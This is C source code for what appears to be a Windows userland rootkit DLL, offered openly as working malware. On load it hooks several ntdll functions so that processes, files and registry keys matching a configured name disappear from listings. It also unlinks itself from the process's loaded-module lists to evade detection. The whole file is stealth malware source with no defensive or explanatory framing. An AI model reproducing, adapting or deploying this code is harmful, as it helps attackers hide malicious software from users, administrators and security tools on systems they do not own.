#include "rku.h"

unsigned char hide_me[] = HIDE_ME;
unsigned short whide_me[] = LHIDE_ME;

// unsigned char dll_name[] = "inf.dll";
// unsigned short sdll_name[] = L"inf.dll";
// unsigned short spath_dll[] = L"C:\\coding\\rootkit-userland\\inf.dll";

// unsigned char dll_name[MAX_PATH];
// unsigned short sdll_name[MAX_PATH];
unsigned short spath_dll[MAX_PATH];
int UnlinkPEBdll(void)
{
    UNICODE_STRING b;
    PEB *pPeb = (PEB *)__readgsqword(0x60);
    PEB_LDR_DATA *Ldr = pPeb->Ldr;
    LIST_ENTRY *ModuleList = &Ldr->InMemoryOrderModuleList;
    LIST_ENTRY *pStartListEntry = ModuleList->Flink;
    LIST_ENTRY *prev_entry = pStartListEntry;
    WCHAR mystr[MAX_PATH] = {0};
    WCHAR substr[MAX_PATH] = {0};
    for (LIST_ENTRY *pListEntry = pStartListEntry; pListEntry != ModuleList; pListEntry = pListEntry->Flink)
    {

        MY_LDR_DATA_TABLE_ENTRY *entry = CONTAINING_RECORD(pListEntry,
                                                           MY_LDR_DATA_TABLE_ENTRY,
                                                           InMemoryOrderLinks);
#ifdef DEBUG
        wprintf(entry->FullDllName.Buffer);
        printf("\n");
#endif
        if (custom_wcscmp(spath_dll, entry->FullDllName.Buffer) == 0)
        {
#ifdef DEBUG
            printf("[+] Found and hid the dll\n");
#endif
            entry->InLoadOrderLinks.Blink->Flink = entry->InLoadOrderLinks.Flink;
            entry->InLoadOrderLinks.Flink->Blink = entry->InLoadOrderLinks.Blink;
            entry->InMemoryOrderLinks.Blink->Flink = entry->InMemoryOrderLinks.Flink;
            entry->InMemoryOrderLinks.Flink->Blink = entry->InMemoryOrderLinks.Blink;
            entry->InInitializationOrderLinks.Blink->Flink = entry->InInitializationOrderLinks.Flink;
            entry->InInitializationOrderLinks.Flink->Blink = entry->InInitializationOrderLinks.Blink;
            entry->HashTableEntry.Blink->Flink = entry->HashTableEntry.Flink;
            entry->HashTableEntry.Flink->Blink = entry->HashTableEntry.Blink;
        }
    }
    return 0;
}

typedef NTSTATUS(NTAPI *fpNtQuerySystemInformation)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength);

int hookNtQSI(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength)
{
    fpNtQuerySystemInformation f;
    GVA(&f);
    if (SystemInformation != NULL && SystemInformationClass == SystemProcessInformation)
    {
        NTSTATUS res = 0;
        res = f(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
        if (res != 0x0)
        {
            return res;
        }
        PSYSTEM_PROCESS_INFORMATION SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
        PSYSTEM_PROCESS_INFORMATION prev = SystemProcInfo;
        while (TRUE)
        {
            if (SystemProcInfo->ImageName.Length && wcscmp(SystemProcInfo->ImageName.Buffer, whide_me) == 0)
            {
                if (SystemProcInfo->NextEntryOffset)
                {
                    prev->NextEntryOffset = prev->NextEntryOffset + SystemProcInfo->NextEntryOffset;
                }
                else
                {
                    prev->NextEntryOffset = 0;
                }
            }
            else
            {
                prev = SystemProcInfo;
            }
            if (!SystemProcInfo->NextEntryOffset)
                break;
            SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo +
                                                           SystemProcInfo->NextEntryOffset);
        }
        return res;
    }
    else
    {
        return f(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
    }
}

typedef NTSTATUS (*fpNtQueryDirectoryFileEx)(
    HANDLE FileHandle,
    HANDLE Event,
    PIO_APC_ROUTINE ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    ULONG QueryFlags,
    PUNICODE_STRING FileName);

NTSTATUS hookNtQDFE(
    HANDLE FileHandle,
    HANDLE Event,
    PIO_APC_ROUTINE ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    ULONG QueryFlags,
    PUNICODE_STRING FileName)
{
    fpNtQueryDirectoryFileEx QDFE;
    GVA(&QDFE);
    int res = QDFE(
        FileHandle,
        Event,
        ApcRoutine,
        ApcContext,
        IoStatusBlock,
        FileInformation,
        Length,
        FileInformationClass,
        QueryFlags,
        FileName);
    ULONGLONG filenameOffset = 0;
    ULONGLONG filenameLenOffset = 0;
    if (!NT_SUCCESS(res))
    {
        return res;
    }
    // printf("Hit NtQueryDirectoryFileEx with classid %d\n", FileInformationClass);
    switch (FileInformationClass)
    {
    case FileDirectoryInformation:
        filenameOffset = (unsigned char *)&(((PFILE_DIRECTORY_INFORMATION)FileInformation)->FileName) -
                         (unsigned char *)FileInformation;
        filenameLenOffset = (unsigned char *)&(((PFILE_DIRECTORY_INFORMATION)FileInformation)->FileNameLength) -
                            (unsigned char *)FileInformation;
        break;
    case FileIdFullDirectoryInformation:
        filenameOffset = (unsigned char *)&(((PFILE_ID_FULL_DIR_INFORMATION)FileInformation)->FileName) -
                         (unsigned char *)FileInformation;
        filenameLenOffset = (unsigned char *)&(((PFILE_ID_FULL_DIR_INFORMATION)FileInformation)->FileNameLength) -
                            (unsigned char *)FileInformation;
        break;
    case FileNamesInformation:
        filenameOffset = (unsigned char *)&(((PFILE_ID_FULL_DIR_INFORMATION)FileInformation)->FileName) -
                         (unsigned char *)FileInformation;
        filenameLenOffset = (unsigned char *)&(((PFILE_ID_FULL_DIR_INFORMATION)FileInformation)->FileNameLength) -
                            (unsigned char *)FileInformation;
        break;
    case FileFullDirectoryInformation:
        // FILE_NAMES_INFORMATION
        filenameOffset = (unsigned char *)&(((PFILE_NAMES_INFORMATION)FileInformation)->FileName) -
                         (unsigned char *)FileInformation;
        filenameLenOffset = (unsigned char *)&(((PFILE_NAMES_INFORMATION)FileInformation)->FileNameLength) -
                            (unsigned char *)FileInformation;
        break;
    case FileBothDirectoryInformation:
        filenameOffset = (unsigned char *)&(((PFILE_BOTH_DIR_INFORMATION)FileInformation)->FileName) -
                         (unsigned char *)FileInformation;
        filenameLenOffset = (unsigned char *)&(((PFILE_BOTH_DIR_INFORMATION)FileInformation)->FileNameLength) -
                            (unsigned char *)FileInformation;
        break;
    case FileIdBothDirectoryInformation:
        // PFILE_ID_BOTH_DIR_INFORMATION
        filenameOffset = (unsigned char *)&(((PFILE_ID_BOTH_DIR_INFORMATION)FileInformation)->FileName) -
                         (unsigned char *)FileInformation;
        filenameLenOffset = (unsigned char *)&(((PFILE_ID_BOTH_DIR_INFORMATION)FileInformation)->FileNameLength) -
                            (unsigned char *)FileInformation;
        break;
    default:
        return res;
    }
    PFILE_BOTH_DIR_INFORMATION current = (PFILE_BOTH_DIR_INFORMATION)FileInformation;

    ULONG next = 0;
    PFILE_BOTH_DIR_INFORMATION prev = current;
    while (1)
    {
        next = current->NextEntryOffset;

        // if (custom_ucscmp(((wchar_t*)((unsigned char *)current + filenameOffset)), *((unsigned char *)current + filenameLenOffset), whide_me, sizeof(whide_me) - 2) == 0)
        if (custom_ucscmp(((wchar_t *)((unsigned char *)current + filenameOffset)),
                          sizeof(whide_me) - 2, whide_me, sizeof(whide_me) - 2) == 0)
        {

            // printf("[+] Found and patched the occurance\n");
            if (current->NextEntryOffset)
            {
                prev->NextEntryOffset += next;
            }
            else
            {
                prev->NextEntryOffset = 0;
            }
        }
        else
        {
            prev = current;
        }
        if (current->NextEntryOffset)
        {
            current = (PFILE_BOTH_DIR_INFORMATION)((unsigned char *)current + next);
        }

        else
        {
            break;
        }
    }
    return res;
}

typedef NTSTATUS (*fpNtQueryDirectoryFile)(
    HANDLE FileHandle,
    HANDLE Event,
    PIO_APC_ROUTINE ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    BOOLEAN ReturnSingleEntry,
    PUNICODE_STRING FileName,
    BOOLEAN RestartScan);
NTSTATUS hookNtQDF(
    HANDLE FileHandle,
    HANDLE Event,
    PIO_APC_ROUTINE ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    BOOLEAN ReturnSingleEntry,
    PUNICODE_STRING FileName,
    BOOLEAN RestartScan)
{
    fpNtQueryDirectoryFile QDF;
    GVA(&QDF);
    int res = QDF(
        FileHandle,
        Event,
        ApcRoutine,
        ApcContext,
        IoStatusBlock,
        FileInformation,
        Length,
        FileInformationClass,
        ReturnSingleEntry,
        FileName,
        RestartScan);
    ULONGLONG filenameOffset = 0;
    ULONGLONG filenameLenOffset = 0;
    // printf("Hit NtQueryDirectoryFile, RetSing %d, fileInfoClass %d\n", ReturnSingleEntry, FileInformationClass);
    if (!NT_SUCCESS(res))
    {
        return res;
    }
    switch (FileInformationClass)
    {
    case FileDirectoryInformation:
        filenameOffset = (unsigned char *)&(((PFILE_DIRECTORY_INFORMATION)FileInformation)->FileName) -
                         (unsigned char *)FileInformation;
        filenameLenOffset = (unsigned char *)&(((PFILE_DIRECTORY_INFORMATION)FileInformation)->FileNameLength) -
                            (unsigned char *)FileInformation;
        break;
    case FileIdFullDirectoryInformation:
        filenameOffset = (unsigned char *)&(((PFILE_ID_FULL_DIR_INFORMATION)FileInformation)->FileName) -
                         (unsigned char *)FileInformation;
        filenameLenOffset = (unsigned char *)&(((PFILE_ID_FULL_DIR_INFORMATION)FileInformation)->FileNameLength) -
                            (unsigned char *)FileInformation;
        break;

    case FileNamesInformation:
        filenameOffset = (unsigned char *)&(((PFILE_ID_FULL_DIR_INFORMATION)FileInformation)->FileName) -
                         (unsigned char *)FileInformation;
        filenameLenOffset = (unsigned char *)&(((PFILE_ID_FULL_DIR_INFORMATION)FileInformation)->FileNameLength) -
                            (unsigned char *)FileInformation;
        break;
    case FileFullDirectoryInformation:
        // FILE_NAMES_INFORMATION
        filenameOffset = (unsigned char *)&(((PFILE_NAMES_INFORMATION)FileInformation)->FileName) -
                         (unsigned char *)FileInformation;
        filenameLenOffset = (unsigned char *)&(((PFILE_NAMES_INFORMATION)FileInformation)->FileNameLength) -
                            (unsigned char *)FileInformation;
        break;
    case FileBothDirectoryInformation:
        filenameOffset = (unsigned char *)&(((PFILE_BOTH_DIR_INFORMATION)FileInformation)->FileName) -
                         (unsigned char *)FileInformation;
        filenameLenOffset = (unsigned char *)&(((PFILE_BOTH_DIR_INFORMATION)FileInformation)->FileNameLength) -
                            (unsigned char *)FileInformation;
        break;
    case FileIdBothDirectoryInformation:
        // PFILE_ID_BOTH_DIR_INFORMATION
        filenameOffset = (unsigned char *)&(((PFILE_ID_BOTH_DIR_INFORMATION)FileInformation)->FileName) -
                         (unsigned char *)FileInformation;
        filenameLenOffset = (unsigned char *)&(((PFILE_ID_BOTH_DIR_INFORMATION)FileInformation)->FileNameLength) - (unsigned char *)FileInformation;
        break;
    }
    PFILE_BOTH_DIR_INFORMATION current = (PFILE_BOTH_DIR_INFORMATION)FileInformation;

    ULONG next = 0;
    PFILE_BOTH_DIR_INFORMATION prev = current;
    while (1)
    {
        next = current->NextEntryOffset;

        if (custom_ucscmp(((wchar_t *)((unsigned char *)current + filenameOffset)),
                          sizeof(whide_me) - 2, whide_me, sizeof(whide_me) - 2) == 0)
        {

            // printf("[+] Found and patched the occurance\n");
            if (current->NextEntryOffset)
            {
                prev->NextEntryOffset += next;
            }
            else
            {
                prev->NextEntryOffset = 0;
            }
        }
        else
        {
            prev = current;
        }
        if (current->NextEntryOffset)
        {
            current = (PFILE_BOTH_DIR_INFORMATION)((unsigned char *)current + next);
        }

        else
        {
            break;
        }
    }
    return res;
}

typedef NTSTATUS (*fpNtOpenKey)(
    PHANDLE KeyHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes);

NTSTATUS hookNtOK(
    PHANDLE KeyHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes)
{
    fpNtOpenKey NtOK;
    GVA(&NtOK);
    NTSTATUS ret = NtOK(KeyHandle, DesiredAccess, ObjectAttributes);
    if (!NT_SUCCESS(ret))
    {
        return ret;
    }
    printf("[?] Hit NtOpenKey!\n");
    printf("[+] ");
    wprintf(ObjectAttributes->ObjectName->Buffer);
    printf("\n");
    if (custom_ucscmp(LHIDE_ME, sizeof(whide_me) - 2,
                      ObjectAttributes->ObjectName->Buffer, sizeof(whide_me) - 2) == 0)
    {
        *KeyHandle = INVALID_HANDLE_VALUE;
        return 0xC000000D;
    }
    return ret;
}

typedef NTSTATUS (*fpNtEnumerateKey)(
    HANDLE KeyHandle,
    ULONG Index,
    KEY_INFORMATION_CLASS KeyInformationClass,
    PVOID KeyInformation,
    ULONG Length,
    PULONG ResultLength);

NTSTATUS hookNtEK(
    HANDLE KeyHandle,
    ULONG Index,
    KEY_INFORMATION_CLASS KeyInformationClass,
    PVOID KeyInformation,
    ULONG Length,
    PULONG ResultLength)
{
    fpNtEnumerateKey NtEK;
    GVA(&NtEK);
    NTSTATUS ret = NtEK(
        KeyHandle,
        Index,
        KeyInformationClass,
        KeyInformation,
        Length,
        ResultLength);
    printf("[?] Hit NtEnumerateKey\n[+] KeyInfoClass = %d\n", KeyInformationClass);
    if (!NT_SUCCESS(ret))
    {
        goto hookNtEK_end;
    }

    ULONGLONG nameOffset;
    ULONGLONG lenOffset;
    switch (KeyInformationClass)
    {
    case KeyBasicInformation:
        nameOffset = (unsigned char *)(((PKEY_BASIC_INFORMATION)KeyInformation)->Name) -
                     (unsigned char *)KeyInformation;
        break;
    case KeyNodeInformation:
        nameOffset = (unsigned char *)(((PKEY_NODE_INFORMATION)KeyInformation)->Name) -
                     (unsigned char *)KeyInformation;
        break;
    case KeyNameInformation:
        nameOffset = (unsigned char *)(((PKEY_NAME_INFORMATION)KeyInformation)->Name) -
                     (unsigned char *)KeyInformation;
        break;
    default:
        goto hookNtEK_end;
    }
    printf("[!!] Value read: ");
    wprintf((wchar_t *)(((unsigned char *)KeyInformation) + nameOffset));
    printf("\n");
    if (custom_ucscmp(
            (wchar_t *)(((unsigned char *)KeyInformation) + nameOffset),
            sizeof(whide_me) - 2,
            LHIDE_ME,
            sizeof(whide_me) - 2) == 0)
    {
        return 0xC0000001;
    }
hookNtEK_end:
    return ret;
}

typedef NTSTATUS (*fpNtEnumerateValueKey)(

    HANDLE KeyHandle,
    ULONG Index,
    KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
    PVOID KeyValueInformation,
    ULONG Length,
    PULONG ResultLength);

NTSTATUS hookNtEVK(
    HANDLE KeyHandle,
    ULONG Index,
    KEY_INFORMATION_CLASS KeyValueInformationClass,
    PVOID KeyValueInformation,
    ULONG Length,
    PULONG ResultLength)
{
    fpNtEnumerateValueKey NtEVK;
    GVA(&NtEVK);
    NTSTATUS ret = NtEVK(
        KeyHandle,
        Index,
        KeyValueInformationClass,
        KeyValueInformation,
        Length,
        ResultLength);
    printf("[?] Hit NtEnumerateValueKey\n[+] KeyInfoClass = %d\n", KeyValueInformationClass);
    ULONGLONG nameOffset = 0;
    ULONGLONG lenOffset = 0;
    if (!NT_SUCCESS(ret))
    {
        return ret;
    }
    switch (KeyValueInformationClass)
    {
    case KeyValueBasicInformation:
        nameOffset = ((unsigned char *)(((PKEY_VALUE_BASIC_INFORMATION)KeyValueInformation)->Name)) -
                     (unsigned char *)KeyValueInformation;
        break;
    case KeyValueFullInformationAlign64:
    case KeyValueFullInformation:
        nameOffset = ((unsigned char *)(((PKEY_VALUE_FULL_INFORMATION)KeyValueInformation)->Name)) -
                     (unsigned char *)KeyValueInformation;
        break;
    default:
        return ret;
    }
    printf("[!-!] Value enumerated is: ");
    wprintf((wchar_t *)(((unsigned char *)KeyValueInformation) + nameOffset));
    printf("\n");
    if (custom_ucscmp(
            (wchar_t *)(((unsigned char *)KeyValueInformation) + nameOffset),
            sizeof(whide_me) - 2,
            LHIDE_ME,
            sizeof(whide_me) - 2) == 0)
    {
        return 0xC0000001;
    }
hookNtEVK_end:
    return ret;
}

typedef NTSTATUS (*fpZwQueryKey)(
    HANDLE KeyHandle,
    KEY_INFORMATION_CLASS KeyInformationClass,
    PVOID KeyInformation,
    ULONG Length,
    PULONG ResultLength);

struct _weird_string
{
    unsigned char unknown[8];
    wchar_t *string;
} typedef weird_string;
struct _STR_KeyHandleTagsInformation
{
    unsigned char unknown[0x58];
    ULONGLONG sz;
    weird_string *str;
} typedef STR_KeyHandleTagsInformation;

NTSTATUS hookZwQK(
    HANDLE KeyHandle,
    KEY_INFORMATION_CLASS KeyInformationClass,
    PVOID KeyInformation,
    ULONG Length,
    PULONG ResultLength)
{
    fpZwQueryKey ZwQK;
    GVA(&ZwQK);

    NTSTATUS ret = ZwQK(
        KeyHandle,
        KeyInformationClass,
        KeyInformation,
        Length,
        ResultLength);
    printf("[?] Hit ZwQueryKey\n[+] KeyInfoClass = %d\n", KeyInformationClass);
    if (!NT_SUCCESS(ret))
    {
        return ret;
    }
    if (KeyInformationClass == KeyHandleTagsInformation)
    {
        printf("[!!] Querying this: ");
        wchar_t *s = ((STR_KeyHandleTagsInformation *)KeyInformation)->str->string;
        wprintf(s);
        printf("\n");
        wchar_t *lastBackslash;
        wchar_t *secondLastBackslash;
        size_t length;
        size_t loop_limit = 128;
        unsigned short tmp = 0;
        // Find the last occurrence of a backslash
        if (((STR_KeyHandleTagsInformation *)KeyInformation)->sz > 128 || ((STR_KeyHandleTagsInformation *)KeyInformation) == 0){
            return ret;
        }
        lastBackslash = s + (wcslen(s) - 1);
        if (lastBackslash != NULL && lastBackslash != s)
        {
            wchar_t *temp = lastBackslash - 1;
            while (temp > s && *temp != L'\\' && loop_limit != 0)
            {
                temp--;
                loop_limit -= 1;
            }
            if (*temp == L'\\' && temp != lastBackslash - 1)
            {
                secondLastBackslash = temp;
                length = lastBackslash - secondLastBackslash - 1;
                if (length > 0)
                {
                    if (custom_ucscmp(
                            secondLastBackslash + 1,
                            sizeof(whide_me) - 2,
                            LHIDE_ME,
                            sizeof(whide_me) - 2) == 0)
                    {
                        return 0xC0000001;
                    }
                    wprintf(L"Extracted string: %ls\n", secondLastBackslash + 1);
                }
            }
        }
        printf("[?] We parsed the string!\n");
    }
    return ret;
}
BOOL WINAPI DllMain(
    HINSTANCE hinstDLL, // handle to DLL module
    DWORD fdwReason,    // reason for calling function
    LPVOID lpvReserved) // reserved
{
    // Perform actions based on the reason for calling.
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        AllocConsole();
        freopen("CONOUT$", "w", stdout);
        // Sleep(5000);
        HookInfo hNtQSI, hNtQDFE, hNtQDF, hNtOK, hNtEK, hNtEVK, hZwQK;
        InstallHook(_GetProcAddressNative("NtQuerySystemInformation"),
                    hookNtQSI, &hNtQSI);
        InstallHook(_GetProcAddressNative("NtQueryDirectoryFileEx"),
                    hookNtQDFE, &hNtQDFE);
        InstallHook(_GetProcAddressNative("NtQueryDirectoryFile"),
                    hookNtQDF, &hNtQDF);
        InstallHook(_GetProcAddressNative("NtOpenKey"), hookNtOK, &hNtOK);
        InstallHook(_GetProcAddressNative("NtEnumerateKey"),
                    hookNtEK, &hNtEK);
        InstallHook(_GetProcAddressNative("NtEnumerateValueKey"),
                    hookNtEVK, &hNtEVK);
        // InstallHook(_GetProcAddressNative("ZwQueryKey"),
        //             hookZwQK, &hZwQK);
        GetModuleFileNameW(hinstDLL, spath_dll, sizeof(spath_dll));
        UnlinkPEBdll();
        break;

    case DLL_THREAD_ATTACH:
        // Do thread-specific initialization.
        break;

    case DLL_THREAD_DETACH:
        // Do thread-specific cleanup.
        break;

    case DLL_PROCESS_DETACH:

        if (lpvReserved != NULL)
        {
            break; // do not do cleanup if process termination scenario
        }
        // RemoveHook(pnt, &hNtQ);
        break;
    }
    return TRUE; // Successful DLL_PROCESS_ATTACH.
}